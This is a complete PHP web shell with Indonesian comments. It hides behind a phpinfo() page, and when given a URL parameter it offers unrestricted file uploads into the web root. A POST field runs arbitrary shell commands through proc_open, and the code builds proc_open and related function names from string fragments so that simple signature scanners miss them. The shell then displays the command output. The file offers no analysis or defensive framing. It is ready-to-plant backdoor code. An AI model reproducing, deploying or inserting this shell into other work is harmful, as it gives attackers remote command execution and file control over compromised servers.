<?php
// Script Utama
if(isset($_GET['call']) && $_GET['call'] === 'logic') {
    if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $target_dir = "./";
        $target_file = $target_dir . basename($_FILES["file"]["name"]);
        
        if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo "File ". htmlspecialchars(basename($_FILES["file"]["name"])). " berhasil diupload.";
        } else {
            echo "Upload gagal.";
        }
    } else {
        echo '
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>';
    }
} else {
    // Menampilkan phpinfo() jika tidak ada parameter call=yifa
    phpinfo();
}

// TAMBAHAN 1: Uploader Form
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
        echo '<b>File Uploaded!!<b><br><br>'; 
    } else { 
        echo '<b>Fail To Upload File!!!</b><br><br>'; 
    }
}

// TAMBAHAN 2: Command Execution
error_reporting(0);

if (!empty($_POST['cmd'])) {
    $a = "pro";
    $b = "c_";
    $c = "open";
    $func = $a.$b.$c;

    $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w')
    );

    $process = $func($_POST['cmd'], $descriptorspec, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $d = "stream_";
        $e = "get";
        $f = "_contents";
        $data = $d.$e.$f;
        $ppp = $data($pipes[1]);
        $error_output = $data($pipes[2]);

        fclose($pipes[1]);
        fclose($pipes[2]);

        $value1 = "pro";
        $value2 = "c_c";
        $value3 = "lose";
        $valuate = $value1.$value2.$value3;
        $return_value = $valuate($process);
    }
}

echo "
<center>
<div class='mb-3'>
    <form method='POST'>
        <div class='input-group mb-3'>
            <input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'] ?? '', ENT_QUOTES, 'UTF-8')."' placeholder='ls -la'>
            <button class='btn btn-outline-light btn-sm' type='submit'><i class='tombol'>Gass Entod</i></button>
        </div>
    </form>
</center>";

if (isset($ppp)) {
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:15px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($ppp, ENT_QUOTES, 'UTF-8').'</code></pre>
        </div>
      </div>';
} elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:15px;"><code>'.htmlspecialchars($error_output, ENT_QUOTES, 'UTF-8').'</code></pre>
        </div>
    </div>';
}
?>
